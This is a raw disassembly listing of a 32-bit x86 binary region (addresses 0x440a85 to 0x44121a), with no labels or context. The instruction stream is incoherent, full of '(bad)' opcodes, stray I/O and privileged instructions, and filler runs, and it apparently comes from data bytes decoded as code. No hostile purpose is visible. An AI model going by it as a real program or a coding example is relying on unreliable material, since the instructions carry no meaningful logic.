  440a85:	jns    0x440ab6
  440a87:	push   ss
  440a88:	das    
  440a89:	jne    0x440ac8
  440a8b:	cmc    
  440a8c:	daa    
  440a8d:	add    al,0x39
  440a8f:	jae    0x440ab8
  440a91:	cmp    eax,0x9027f33a
  440a96:	cmp    DWORD PTR [edx],esi
  440a98:	sub    al,dl
  440a9a:	cmp    DWORD PTR [ebp+0x2],esi
  440a9d:	out    0xa3,eax
  440a9f:	push   ebx
  440aa0:	imul   ecx,edx,0x2f027503
  440aa6:	xor    eax,0x34a032ea
  440aab:	pop    edx
  440aac:	xor    eax,0x30b73716
  440ab1:	sub    eax,0x3530bf32
  440ab6:	xor    al,bh
  440ab8:	xor    BYTE PTR ds:0x530bf32,ch
  440abe:	xor    dl,BYTE PTR [edi-0x60cdf2d0]
  440ac4:	xor    ch,dh
  440ac6:	xor    DWORD PTR [edi+0x7f31ed30],eax
  440acc:	xor    BYTE PTR [ebp+0x31],ah
  440acf:	imul   DWORD PTR [edi]
  440ad1:	ins    DWORD PTR es:[edi],dx
  440ad2:	xor    DWORD PTR [eax],eax
  440ad4:	add    BYTE PTR [eax],al
  440ad6:	add    BYTE PTR [eax],al
  440ad8:	jmp    FWORD PTR [edi]
  440ada:	jne    0x440b0d
  440adc:	pop    es
  440add:	xor    BYTE PTR [ebp+0x31],ch
  440ae0:	jmp    FWORD PTR [edi]
  440ae2:	test   DWORD PTR [ecx],esi
  440ae4:	pop    ss
  440ae5:	xor    BYTE PTR [ebp+0x75301f31],cl
  440aeb:	xor    DWORD PTR [edi],eax
  440aed:	xor    BYTE PTR [eax],al
  440aef:	jae    0x440a75
  440af1:	lods   al,BYTE PTR ds:[esi]
  440af2:	xor    DWORD PTR [ebx],ebp
  440af4:	fs inc esp
  440af6:	xor    DWORD PTR [ebx],esi
  440af8:	fs cmp al,0x31
  440afb:	cmp    esp,DWORD PTR [esp+edx*2+0x31]
  440aff:	xor    esp,DWORD PTR [esp+ecx*2+0x31]
  440b03:	or     eax,DWORD PTR [esp+eiz*2+0x31]
  440b07:	adc    eax,DWORD PTR [esp+ebx*2+0x31]
  440b0b:	sti    
  440b0c:	inc    ebp
  440b0d:	je     0x440b40
  440b0f:	repz inc ebp
  440b11:	ins    BYTE PTR es:[edi],dx
  440b12:	xor    ebx,ebp
  440b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440b15:	add    al,0x31
  440b17:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440b19:	cld    
  440b1a:	xor    bl,bh
  440b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440b1d:	adc    al,0x31
  440b1f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440b21:	or     al,0x31
  440b23:	or     eax,DWORD PTR [esp+0x1c841331]
  440b2a:	xor    ebx,edi
  440b2c:	test   DWORD PTR [ecx+esi*1],esi
  440b2f:	repz test DWORD PTR [ecx+esi*1],ebp
  440b33:	sub    esp,DWORD PTR [esp+eax*8+0x30]
  440b37:	xor    esp,DWORD PTR [esp+edi*4+0x30]
  440b3b:	cmp    eax,DWORD PTR [eax]
  440b3d:	add    BYTE PTR [eax],al
  440b3f:	add    BYTE PTR [eax],al
  440b41:	fs aam 0x30
  440b44:	xor    esp,DWORD PTR [esp+ecx*8+0x30]
  440b48:	or     eax,DWORD PTR [esp+eiz*8+0x30]
  440b4c:	adc    eax,DWORD PTR [eax+ebx*2+0x30]
  440b50:	stc    
  440b51:	ds out dx,al
  440b53:	aaa    
  440b54:	repz ds in al,dx
  440b57:	aaa    
  440b58:	bound  esi,QWORD PTR [ecx-0x5676c889]
  440b5e:	mov    eax,ds:0xe9a16137
  440b63:	ss aaa 
  440b65:	sahf   
  440b66:	sub    esi,DWORD PTR [esi]
  440b68:	rcl    DWORD PTR [eax-0x63ffca89],0x28
  440b6f:	das    
  440b70:	cmp    eax,DWORD PTR [edi+eiz*1]
  440b73:	pop    eax
  440b74:	cmp    esp,edx
  440b76:	es jb  0x440bb4
  440b79:	push   edx
  440b7a:	and    eax,0x25583b93
  440b7f:	(bad)  
  440b80:	cmp    ebp,DWORD PTR [ebp+0x203c632f]
  440b86:	sub    ch,BYTE PTR [ebx+0x2a5e3c]
  440b8c:	add    BYTE PTR [ebx+esi*4+0x3e0fff9],bl
  440b93:	add    BYTE PTR [eax],al
  440b95:	xchg   ecx,eax
  440b96:	xor    ecx,DWORD PTR [ebx]
  440b98:	xor    bl,cl
  440b9a:	cs pop edx
  440b9c:	xor    esp,eax
  440b9e:	xor    ecx,DWORD PTR [edx+esi*1-0x20]
  440ba2:	sub    eax,0x3320
  440ba7:	add    BYTE PTR [eax],al
  440ba9:	add    BYTE PTR [ebp+ebp*1+0x2de533a3],ah
  440bb0:	in     al,0x33
  440bb2:	xor    ch,BYTE PTR [esi]
  440bb4:	add    eax,0x8a327a34
  440bb9:	xor    al,0xf2
  440bbb:	push   ss
  440bbc:	mov    dh,0x34
  440bbe:	in     al,0x16
  440bc0:	add    dh,BYTE PTR ds:0x37143130
  440bc6:	sahf   
  440bc7:	xor    al,bh
  440bc9:	aaa    
  440bca:	sbb    BYTE PTR [ebx],ch
  440bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440bcd:	cmp    ch,dl
  440bcf:	sub    cl,BYTE PTR [edx]
  440bd1:	cmp    DWORD PTR [esp+ebp*1],edx
  440bd4:	xchg   esp,eax
  440bd5:	cmp    eax,ebp
  440bd7:	sub    edx,DWORD PTR [eax-0x6fd9cac6]
  440bdd:	cmp    esi,ebp
  440bdf:	and    eax,0x2efc3c52
  440be4:	and    BYTE PTR ds:0x3ee22fad,bh
  440bea:	jne    0x440bbe
  440bec:	add    BYTE PTR ss:[ebp+0x59],dh
  440bf0:	cmp    al,0xfe
  440bf2:	retf   0xfcb8
  440bf5:	push   DWORD PTR [ebp+0x60]
  440bf8:	sub    al,0x40
  440bfa:	test   DWORD PTR [ecx],edi
  440bfc:	sub    al,0xa0
  440bfe:	sub    BYTE PTR fs:0x2dc564aa,0xbc
  440c06:	sbb    ebp,DWORD PTR fs:[esi]
  440c09:	enter  0x2964,0x2e
  440c0d:	jmp    0x440c0f
  440c0f:	add    BYTE PTR [eax],al
  440c11:	add    BYTE PTR [eax],al
  440c13:	inc    esp
  440c14:	ucomiss xmm7,xmm1
  440c17:	inc    esp
  440c18:	jno    0x440c4c
  440c1a:	cmova  esp,DWORD PTR [ecx+0x32]
  440c1e:	push   ds
  440c1f:	inc    edi
  440c20:	inc    ecx
  440c21:	xor    ch,BYTE PTR [edi]
  440c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440c24:	mov    bl,0x32
  440c26:	cmp    esp,DWORD PTR [edi-0x58afd1ce]
  440c2c:	fisubr WORD PTR ds:0x2d82a78e
  440c32:	daa    
  440c33:	xchg   BYTE PTR [eax],cl
  440c35:	sub    eax,0x2c798674
  440c3a:	lods   al,BYTE PTR ds:[esi]
  440c3b:	xchg   BYTE PTR [ebp+0x5586d62c],dl
  440c41:	sub    BYTE PTR ds:0x42286c69,cl
  440c47:	popa   
  440c48:	das    
  440c49:	xor    BYTE PTR [ecx+0x69],dl
  440c4c:	adc    esi,DWORD PTR [eax]
  440c4e:	xchg   edx,eax
  440c4f:	popa   
  440c50:	mov    eax,0x9749d02f
  440c55:	das    
  440c56:	add    al,0x40
  440c58:	dec    ebx
  440c59:	das    
  440c5a:	adc    eax,0x842f5248
  440c5f:	inc    eax
  440c60:	loopne 0x440c90
  440c62:	fwait
  440c63:	test   al,0x2b
  440c65:	das    
  440c66:	mov    bh,0xa0
  440c68:	add    bl,BYTE PTR [eax+0x31]
  440c6b:	in     al,0x2f
  440c6d:	in     eax,0x2d
  440c6f:	push   0x2c
  440c71:	stc    
  440c72:	sub    eax,0x2e172c99
  440c77:	add    BYTE PTR [eax],al
  440c79:	add    BYTE PTR [eax],al
  440c7b:	add    BYTE PTR [eax],dh
  440c7d:	sub    al,0xa4
  440c7f:	sub    eax,0x2dd02c20
  440c84:	inc    esi
  440c85:	sub    al,0xb3
  440c87:	sub    eax,0x2e502cfe
  440c8c:	in     eax,0x2c
  440c8e:	cmp    ebp,DWORD PTR [esi]
  440c90:	mov    esp,0x8f2e022c
  440c95:	sub    al,0x1b
  440c97:	cs jnp 0x440cc7
  440c9a:	cwde   
  440c9b:	add    ch,BYTE PTR cs:0x2df42f68
  440ca2:	pop    eax
  440ca3:	das    
  440ca4:	(bad)  ds:0x2d432f4b
  440caa:	imul   edi,DWORD PTR [ebx],0x3b192978
  440cb0:	repz sub BYTE PTR [ebx-0x6fd9f7c6],al
  440cb7:	aaa    
  440cb8:	inc    ebx
  440cb9:	shl    DWORD PTR es:[edi],0x70
  440cbd:	daa    
  440cbe:	add    eax,0x6a279139
  440cc3:	cmp    bh,ah
  440cc5:	es ja  0x440d00
  440cc8:	sub    eax,0xb335e627
  440ccd:	and    al,0xec
  440ccf:	ss int3 
  440cd1:	and    al,0x54
  440cd3:	cmp    DWORD PTR ss:0x275369b,esp
  440cda:	out    0x53,eax
  440cdc:	or     esp,DWORD PTR [ebp+0x5a]
  440cdf:	add    eax,DWORD PTR [eax]
  440ce1:	add    BYTE PTR [eax],al
  440ce3:	add    BYTE PTR [eax],al
  440ce5:	jne    0x440ce9
  440ce7:	pusha  
  440ce8:	xor    eax,edx
  440cea:	xor    al,BYTE PTR [eax]
  440cec:	fbld   TBYTE PTR [edx+edi*4-0x755ba7d3]
  440cf3:	sub    eax,0x2d51a429
  440cf8:	dec    edx
  440cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440cfa:	pop    ecx
  440cfb:	sub    eax,0x2d02845e
  440d00:	fadd   QWORD PTR [edi-0x784dd2f4]
  440d06:	mov    ah,0x2c
  440d08:	mov    ebx,0x8c2c7b87
  440d0d:	addr16 mov dl,0x2c
  440d10:	cmp    ah,BYTE PTR [edi+0xd]
  440d13:	xor    al,0xb3
  440d15:	push   edx
  440d16:	repnz xor edi,DWORD PTR [ebp+0x4a]
  440d1a:	dec    esi
  440d1b:	xor    edi,ebx
  440d1d:	inc    ebp
  440d1e:	and    eax,0xb3459033
  440d23:	xor    dh,BYTE PTR [edx]
  440d25:	inc    ebp
  440d26:	inc    esi
  440d27:	xor    cl,BYTE PTR [edx]
  440d29:	inc    ebp
  440d2a:	ins    DWORD PTR es:[edi],dx
  440d2b:	xor    dh,BYTE PTR [eax+eiz*4-0x67cdce84]
  440d32:	xor    al,0x31
  440d34:	rcl    BYTE PTR [ebx-0x760dcea7],0xe
  440d3b:	xor    DWORD PTR ds:0x4230bea0,eax
  440d41:	cwde   
  440d42:	aas    
  440d43:	xor    dh,cl
  440d45:	nop
  440d46:	pop    ds
  440d47:	cmp    bh,dh
  440d49:	add    BYTE PTR [eax],al
  440d4b:	add    BYTE PTR [eax],al
  440d4d:	add    BYTE PTR [esi+0x3e],bh
  440d50:	xor    eax,0x34ba6fb5
  440d55:	cs ins BYTE PTR es:[edi],dx
  440d57:	imul   esi,DWORD PTR [eiz*8-0x7bc45a96],0x5d
  440d5f:	pop    ds
  440d60:	cmp    edi,DWORD PTR [edx+ecx*2]
  440d63:	in     al,0x3a
  440d65:	dec    esi
  440d66:	inc    edx
  440d67:	push   edi
  440d68:	cmp    al,BYTE PTR [eax]
  440d6a:	je     0x440d98
  440d6c:	mov    BYTE PTR [esi],bh
  440d6e:	retf   
  440d6f:	sub    al,0x36
  440d71:	aas    
  440d72:	pop    edi
  440d73:	sub    eax,0x2e083fa8
  440d78:	fistp  QWORD PTR [edi]
  440d7a:	int3   
  440d7b:	(bad)  
  440d7d:	push   esp
  440d7f:	(bad)  
  440d80:	(bad)  
  440d81:	(bad)  
  440d82:	jle    0x440db2
  440d84:	aaa    
  440d85:	xor    cl,ch
  440d87:	das    
  440d88:	xor    BYTE PTR [eax],0xf6
  440d8b:	cs add al,0x31
  440d8e:	sub    ebp,DWORD PTR [edi]
  440d90:	shl    BYTE PTR [edx],0xb7
  440d93:	xor    cl,BYTE PTR [edx+0x24315a33]
  440d99:	xor    al,0xd6
  440d9b:	adc    edx,DWORD PTR [ebx+0x37324b34]
  440da1:	xor    eax,0x35851500
  440da6:	sbb    BYTE PTR [ebx],dl
  440da8:	add    BYTE PTR [esi],dh
  440daa:	fist   DWORD PTR ds:0x144c365d
  440db0:	div    BYTE PTR [esi]
  440db2:	add    BYTE PTR [eax],al
  440db4:	add    BYTE PTR [eax],al
  440db6:	add    dl,cl
  440db8:	adc    eax,0x26c33873
  440dbd:	lods   al,BYTE PTR ds:[esi]
  440dbe:	cmp    BYTE PTR [esi+0x28],ah
  440dc1:	push   ds
  440dc2:	cmp    DWORD PTR [edx+0x27],ebp
  440dc5:	cmp    BYTE PTR [ecx],bh
  440dc7:	xchg   edi,eax
  440dc8:	daa    
  440dc9:	push   esp
  440dca:	cmp    DWORD PTR [edi+eiz*1+0x28c53967],esi
  440dd1:	mov    al,ds:0xda280539
  440dd6:	cmp    DWORD PTR [eax-0x7fc5bdd8],eax
  440ddc:	sub    BYTE PTR [edx+0x3a],dl
  440ddf:	jo     0x440e09
  440de1:	lds    edi,FWORD PTR [edx]
  440de3:	stc    
  440de4:	sub    BYTE PTR [ecx],al
  440de6:	cmp    esi,DWORD PTR [ebp+0x37]
  440de9:	aaa    
  440dea:	ss dec esi
  440dec:	std    
  440ded:	ss ins DWORD PTR es:[edi],dx
  440def:	add    dh,BYTE PTR ds:[edi]
  440df2:	cmp    DWORD PTR [esi],0xb1e530be
  440df8:	in     al,0x30
  440dfa:	sub    BYTE PTR [eax-0x5fc1ce54],ch
  440e00:	sbb    BYTE PTR [edx],dh
  440e02:	sub    BYTE PTR [ebx-0x6de0cd54],bl
  440e08:	xchg   esi,eax
  440e09:	xor    ebp,DWORD PTR [ebp-0x76]
  440e0c:	aad    0x33
  440e0e:	mov    ds:0xd7343182,eax
  440e13:	jp     0x440e19
  440e15:	xor    al,0xf8
  440e17:	jb     0x440e72
  440e19:	ins    BYTE PTR es:[edi],dx
  440e1a:	inc    BYTE PTR [eax]
  440e1c:	add    BYTE PTR [eax],al
  440e1e:	add    BYTE PTR [eax],al
  440e20:	stos   BYTE PTR es:[edi],al
  440e21:	mov    ah,0xfc
  440e23:	push   DWORD PTR [ebp-0x2a]
  440e26:	sub    al,0x8b
  440e28:	gs call 0xba89a55a
  440e2e:	sub    al,0xa7
  440e30:	inc    ebp
  440e31:	retf   0xb72c
  440e34:	inc    ebp
  440e35:	sbb    BYTE PTR ds:0x2d0545cb,ch
  440e3b:	jecxz  0x440de2
  440e3d:	pusha  
  440e3e:	sub    eax,0x2d3da400
  440e43:	adc    eax,0x3432f6a4
  440e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440e49:	and    eax,0x25843e33
  440e4e:	xor    ecx,DWORD PTR [esi-0x7c]
  440e51:	cs xor ecx,esp
  440e54:	xchg   DWORD PTR [eax+0x1981ec37],ebp
  440e5a:	aaa    
  440e5b:	lea    ebp,[eax-0x75]
  440e5e:	ss scas al,BYTE PTR es:[edi]
  440e60:	pusha  
  440e61:	shl    BYTE PTR [esi],cl
  440e63:	ret    0x268
  440e66:	mov    edi,0x9d181239
  440e6b:	cmp    DWORD PTR [edx],edx
  440e6d:	sbb    dl,bh
  440e6f:	cmp    DWORD PTR [edi-0x13c5d4e8],esp
  440e75:	sbb    BYTE PTR [edx+edi*1+0x15],bl
  440e79:	sbb    DWORD PTR [esi+0x3b],esp
  440e7c:	and    ebx,DWORD PTR [edx]
  440e7e:	sbb    eax,0x9b1b512c
  440e83:	sub    eax,0x0
  440e88:	add    cl,bl
  440e8a:	sbb    ebp,ebx
  440e8c:	sub    eax,0x2eb81cdc
  440e91:	fistp  DWORD PTR ds:0x1e9a3003
  440e97:	mov    eax,0xe41f672f
  440e9c:	xor    BYTE PTR [ecx+0x309b1f],cl
  440ea2:	and    BYTE PTR [edx+esi*1+0x34],al
  440ea6:	and    DWORD PTR [edx+esi*1+0x32c32147],ebx
  440ead:	adc    ah,BYTE PTR [ecx]
  440eaf:	xchg   edx,eax
  440eb0:	xor    dh,bh
  440eb2:	and    DWORD PTR [edi+0x33],eax
  440eb5:	shl    BYTE PTR [ecx],1
  440eb7:	dec    edi
  440eb8:	xor    edi,DWORD PTR [edx-0x74ccfadf]
  440ebe:	and    edi,esp
  440ec0:	add    esi,DWORD PTR [ebx+0x61]
  440ec3:	sbb    al,BYTE PTR [esi*2-0x47cc33fe]
  440eca:	adc    bh,BYTE PTR [eax]
  440ecc:	xor    al,0xc2
  440ece:	adc    al,BYTE PTR [edi+0x34]
  440ed1:	int    0x12
  440ed3:	pusha  
  440ed4:	xor    ebp,ebx
  440ed6:	adc    DWORD PTR [ebp-0x61edfecd],edx
  440edc:	xor    esp,DWORD PTR [edi+0x13]
  440edf:	fdiv   QWORD PTR [edx+ebp*2]
  440ee2:	adc    eax,DWORD PTR [eax]
  440ee4:	pop    edx
  440ee5:	popa   
  440ee6:	sub    BYTE PTR [esi],0x8c
  440ee9:	imul   ebp,DWORD PTR [ecx+0x2e],0x12
  440ef0:	add    BYTE PTR [eax],al
  440ef2:	arpl   sp,bx
  440ef4:	sub    eax,0x33c44ac5
  440ef9:	and    eax,0x7133f14d
  440efe:	dec    edx
  440eff:	jl     0x440f34
  440f01:	push   edx
  440f02:	inc    edx
  440f03:	call   0x1433:0x2caa3f33
  440f0a:	lods   al,BYTE PTR ds:[esi]
  440f0b:	mov    edi,0x759cef31
  440f10:	xor    DWORD PTR [ebp+0x5a31369c],eax
  440f16:	mov    ebp,?
  440f18:	xor    BYTE PTR [edx+0x7130908f],ah
  440f1e:	jg     0x440eb4
  440f20:	xor    BYTE PTR [edi+0x4b30457f],al
  440f26:	outs   dx,DWORD PTR ds:[esi]
  440f27:	imul   esi,DWORD PTR [eax],0x38026f3b
  440f2d:	out    0x4e,al
  440f2f:	or     edi,DWORD PTR [eax]
  440f31:	iret   
  440f32:	dec    esi
  440f33:	pop    ss
  440f34:	cmp    BYTE PTR [ecx-0x4bc845a2],bh
  440f3a:	pop    esi
  440f3b:	icebp  
  440f3c:	aaa    
  440f3d:	xchg   ecx,eax
  440f3e:	dec    esi
  440f3f:	fdiv   QWORD PTR [edi]
  440f41:	outs   dx,BYTE PTR ds:[esi]
  440f42:	dec    esi
  440f43:	lea    esi,[edi]
  440f45:	aas    
  440f46:	sahf   
  440f47:	inc    esi
  440f48:	aaa    
  440f49:	daa    
  440f4a:	sahf   
  440f4b:	cmp    dh,BYTE PTR [edi]
  440f4d:	add    cl,BYTE PTR [esi-0x761ec891]
  440f53:	add    dh,BYTE PTR [edi]
  440f55:	icebp  
  440f56:	add    BYTE PTR [eax],al
  440f58:	add    BYTE PTR [eax],al
  440f5a:	add    BYTE PTR [edi-0x600ec8f7],bl
  440f60:	sub    BYTE PTR [edi],dh
  440f62:	dec    DWORD PTR [edi+0x71003716]
  440f68:	sub    eax,ebx
  440f6a:	cmp    DWORD PTR [esi],ecx
  440f6c:	sub    al,0xd3
  440f6e:	cmp    DWORD PTR [esi],edi
  440f70:	sub    al,0xe
  440f72:	cmp    dh,BYTE PTR [ecx]
  440f74:	cs push ds
  440f76:	cmp    al,BYTE PTR [ecx+0x2e]
  440f79:	stos   DWORD PTR es:[edi],eax
  440f7a:	cmp    ch,BYTE PTR [eax-0x61c435d3]
  440f80:	das    
  440f81:	cmp    DWORD PTR ds:0x3e1d2fe2,0x3e65146f
  440f8b:	fs adc al,0xb1
  440f8e:	ds sbb eax,0xfd3ec115
  440f94:	adc    al,0xd1
  440f96:	ds sub eax,0xd43ee114
  440f9c:	adc    dh,BYTE PTR [esi+0x3f]
  440f9f:	fdivr  st(3),st
  440fa1:	stc    
  440fa2:	jmp    esp
  440fa4:	push   es
  440fa5:	add    BYTE PTR [eax],al
  440fa7:	cli    
  440fa8:	adc    edi,DWORD PTR [eax+esi*1+0x4d]
  440fac:	push   ss
  440fad:	das    
  440fae:	xor    DWORD PTR [ebx+edx*1],ebx
  440fb1:	jle    0x440fe4
  440fb3:	dec    ebx
  440fb4:	adc    ebx,DWORD PTR [edi-0x46ece8cf]
  440fba:	xor    DWORD PTR [ecx+0x13],esp
  440fbd:	or     al,0x32
  440fbf:	add    BYTE PTR [eax],al
  440fc1:	add    BYTE PTR [eax],al
  440fc3:	add    bh,bh
  440fc5:	adc    eax,0x18333262
  440fca:	xor    BYTE PTR [ebx],0x22
  440fcd:	adc    eax,0x17b633b4
  440fd2:	fidiv  WORD PTR ds:0x360d1867
  440fd8:	sbb    al,0x19
  440fda:	ds ss popf 
  440fdd:	sbb    al,0x67
  440fdf:	ss stos BYTE PTR es:[edi],al
  440fe1:	sbb    al,0x88
  440fe3:	ss jne 0x440f6b
  440fe6:	ss mov edi,0xd636a48b
  440fec:	and    DWORD PTR [eax+0x3e6a0236],0x37
  440ff3:	push   eax
  440ff4:	(bad)  
  440ff5:	shl    BYTE PTR [esi],1
  440ff7:	mov    gs,WORD PTR [edx-0x7a]
  440ffa:	aaa    
  440ffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440ffc:	bound  edi,QWORD PTR [ebp-0x5eb54ac9]
  441002:	aaa    
  441003:	daa    
  441004:	dec    ebp
  441005:	and    al,0x2c
  441007:	je     0x441046
  441009:	jecxz  0x44102f
  44100b:	sar    DWORD PTR ds:0xaddd2479,0x71
  441012:	and    al,0xf0
  441014:	lods   eax,DWORD PTR ds:[esi]
  441015:	pushf  
  441016:	and    eax,0x256e9c70
  44101b:	call   0xba8c:0xe2257b9c
  441022:	and    eax,0x2a0d8f11
  441027:	push   0x0
  441029:	add    BYTE PTR [eax],al
  44102b:	add    BYTE PTR [eax],al
  44102d:	jg     0x440fef
  44102f:	sub    bl,BYTE PTR [edi+0x72aca7f]
  441035:	outs   dx,BYTE PTR ds:[esi]
  441036:	jo     0x441063
  441038:	and    ch,BYTE PTR [esi-0x69]
  44103b:	sub    ebp,DWORD PTR [esi-0x32d42da2]
  441041:	pop    esi
  441042:	les    ebp,FWORD PTR [ebx]
  441044:	cmc    
  441045:	dec    esi
  441046:	add    esi,DWORD PTR [eax]
  441048:	and    DWORD PTR [ecx-0x3c],ecx
  44104b:	sub    BYTE PTR [esi-0x28d6e6bf],dh
  441051:	cmp    DWORD PTR [esi],eax
  441053:	sub    DWORD PTR [edx-0x50],ebp
  441056:	enter  0x1029,0xab
  44105a:	nop
  44105b:	bound  esp,QWORD PTR cs:[ebx-0x655cd0c8]
  441062:	add    ah,bh
  441064:	and    edx,DWORD PTR [ebx+0x5e]
  441067:	mov    BYTE PTR [esi*2-0x1fca97fe],0x13
  44106f:	lahf   
  441070:	xor    eax,0x31fe1450
  441075:	lods   eax,DWORD PTR ds:[esi]
  441076:	adc    DWORD PTR [ebx+esi*1+0x4],esp
  44107a:	adc    bh,BYTE PTR [eax+0x33]
  44107d:	in     al,0x11
  44107f:	cwde   
  441080:	xor    edi,DWORD PTR [edx+edx*1]
  441083:	lahf   
  441084:	xor    ecx,DWORD PTR [edi]
  441086:	adc    ch,dl
  441088:	aaa    
  441089:	push   0x4837dc16
  44108e:	push   ss
  44108f:	sub    DWORD PTR [eax],edi
  441091:	add    BYTE PTR [eax],al
  441093:	add    BYTE PTR [eax],al
  441095:	add    BYTE PTR [esi+edx*1+0x16fc3800],cl
  44109c:	push   esp
  44109d:	cmp    BYTE PTR [edi+edx*1],dl
  4410a0:	inc    esp
  4410a1:	cmp    BYTE PTR [eax],ah
  4410a3:	pop    ss
  4410a4:	xchg   ecx,eax
  4410a5:	cmp    BYTE PTR [esi+edx*1+0x16cd384c],bh
  4410ac:	pop    ecx
  4410ad:	cmp    BYTE PTR [edi+edx*1+0x9],ah
  4410b1:	cmp    DWORD PTR [eax+0x5138b617],ecx
  4410b7:	pop    ss
  4410b8:	mov    ch,0x38
  4410ba:	add    al,0x18
  4410bc:	jp     0x4410f7
  4410be:	xchg   edx,eax
  4410bf:	pop    ss
  4410c0:	(bad)  ds:0x36c51433
  4410c6:	or     dl,BYTE PTR ds:0x150e369a
  4410cc:	popa   
  4410cd:	aaa    
  4410ce:	(bad)  
  4410cf:	adc    eax,0x15d63776
  4410d4:	inc    eax
  4410d5:	aaa    
  4410d6:	int3   
  4410d7:	adc    eax,0x156e373a
  4410dc:	out    0x2b,al
  4410de:	jns    0x4410fa
  4410e0:	add    dl,bl
  4410e2:	mov    ?,ebp
  4410e4:	aaa    
  4410e5:	ret    0x2b8e
  4410e8:	cmp    BYTE PTR [ecx+eiz*4],bl
  4410eb:	sbb    DWORD PTR [eax],edi
  4410ed:	dec    edx
  4410ee:	cdq    
  4410ef:	shl    DWORD PTR [edi],cl
  4410f1:	stos   DWORD PTR es:[edi],eax
  4410f2:	mov    ds,WORD PTR [ecx+0x37]
  4410f5:	in     eax,dx
  4410f6:	mov    DWORD PTR [eax],ebp
  4410f8:	aaa    
  4410f9:	sub    BYTE PTR [eax],al
  4410fb:	add    BYTE PTR [eax],al
  4410fd:	add    BYTE PTR [eax],al
  4410ff:	pusha  
  441100:	mov    ch,0x36
  441102:	dec    ebx
  441103:	pop    eax
  441104:	(bad)  
  441105:	ss fs push ecx
  441108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441109:	ror    DWORD PTR ss:[ecx+0x20],0x36
  44110e:	push   eax
  44110f:	pop    esp
  441110:	sahf   
  441111:	xor    eax,0x356c5cbe
  441116:	loop   0x441167
  441118:	mov    bh,0x34
  44111a:	add    al,0x4e
  44111c:	fnsave [eax+eax*2]
  44111f:	lahf   
  441120:	repnz cmp eax,esp
  441123:	call   0x3bac:0xa5283c2f
  44112a:	fsub   QWORD PTR [ebp-0x7a38c505]
  441130:	loope  0x44116c
  441132:	int3   
  441133:	test   eax,ebx
  441135:	cmp    dh,BYTE PTR [ebx-0x7b]
  441138:	inc    ebp
  441139:	cmp    dh,bh
  44113b:	mov    bh,cl
  44113d:	cmp    ebx,edx
  44113f:	pusha  
  441140:	jg     0x44117b
  441142:	inc    ebp
  441143:	pop    eax
  441144:	add    DWORD PTR [ecx],edi
  441146:	or     al,0x52
  441148:	out    0x38,al
  44114a:	and    eax,0xe900024b
  44114f:	inc    esi
  441150:	pop    esp
  441151:	clc    
  441152:	cmp    DWORD PTR [esi+0x2],esi
  441155:	add    ah,ch
  441157:	inc    esi
  441158:	and    al,0x30
  44115a:	into   
  44115b:	inc    esi
  44115c:	retf   0x2f
  44115f:	sub    edx,DWORD PTR [eax]
  441161:	dec    ebp
  441162:	xor    BYTE PTR [eax],al
  441164:	add    BYTE PTR [eax],al
  441166:	add    BYTE PTR [eax],al
  441168:	repz (bad)
  44116b:	xor    ch,bl
  44116d:	vmread DWORD PTR [eax],esi
  441170:	ror    DWORD PTR [edi],cl
  441172:	lods   al,BYTE PTR ds:[esi]
  441173:	xor    BYTE PTR [edi],al
  441175:	pop    ss
  441176:	retf   0x3530
  441179:	pop    ss
  44117a:	xlat   BYTE PTR ds:[ebx]
  44117b:	xor    BYTE PTR [edi+edx*1],bl
  44117e:	hlt    
  44117f:	xor    BYTE PTR [esi],ah
  441181:	pop    ss
  441182:	cli    
  441183:	xor    BYTE PTR [eax+0x11],dl
  441186:	push   ds
  441187:	xor    DWORD PTR [edx+0xf],ebx
  44118a:	xchg   esp,eax
  44118b:	xor    DWORD PTR ds:0x46320110,ebp
  441191:	adc    bl,BYTE PTR [ebx]
  441193:	xor    ah,BYTE PTR [esi]
  441195:	adc    dh,BYTE PTR [eax]
  441197:	xor    bl,BYTE PTR [esi+0x10]
  44119a:	xor    bl,BYTE PTR ds:[eax+0x10]
  44119e:	push   esp
  44119f:	xor    ah,BYTE PTR [ebx+0x10]
  4411a2:	xor    BYTE PTR [edx],0x65
  4411a5:	adc    BYTE PTR [edx-0x62ed45ce],ch
  4411ab:	xor    edx,DWORD PTR [edx+edx*1]
  4411ae:	in     eax,0x33
  4411b0:	and    dl,BYTE PTR [esp+ebp*2]
  4411b3:	xor    al,0xd8
  4411b5:	adc    edi,DWORD PTR [ecx+0x34]
  4411b8:	neg    DWORD PTR [edx]
  4411ba:	in     eax,0x34
  4411bc:	ja     0x4411d1
  4411be:	push   esp
  4411bf:	xor    eax,0x3577150b
  4411c4:	not    DWORD PTR [ebx]
  4411c6:	in     al,0x35
  4411c8:	mov    bh,0x15
  4411ca:	xor    DWORD PTR [esi],0x0
  4411d0:	add    BYTE PTR [esi+0x14],al
  4411d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4411d4:	and    edx,DWORD PTR ss:[edx+edi*2]
  4411d8:	aaa    
  4411d9:	das    
  4411da:	adc    eax,0x298739ec
  4411df:	adc    DWORD PTR [edx],edi
  4411e1:	jne    0x44122f
  4411e3:	es xor eax,0x66267e3f
  4411e9:	scas   eax,DWORD PTR es:[edi]
  4411ea:	iret   
  4411eb:	and    eax,0x25f5afae
  4411f0:	jne    0x441190
  4411f2:	test   al,0x29
  4411f4:	push   ebx
  4411f5:	cwde   
  4411f6:	lea    ebp,[ecx]
  4411f8:	pop    ebp
  4411f9:	nop
  4411fa:	scas   eax,DWORD PTR es:[edi]
  4411fb:	sub    BYTE PTR [edi-0x78],ch
  4411fe:	loope  0x441228
  441200:	jns    0x441182
  441202:	fisubr DWORD PTR [ecx]
  441204:	loop   0x44127e
  441206:	sub    ah,BYTE PTR gs:0x7f29fb73
  44120d:	imul   edx,edx,0x2a
  441210:	ret    0x5f63
  441213:	sub    ebx,DWORD PTR [eax]
  441215:	pop    edx
  441216:	and    ch,BYTE PTR [ebx]
  441218:	push   edi
  441219:	push   edx
  44121a:	out    dx,al
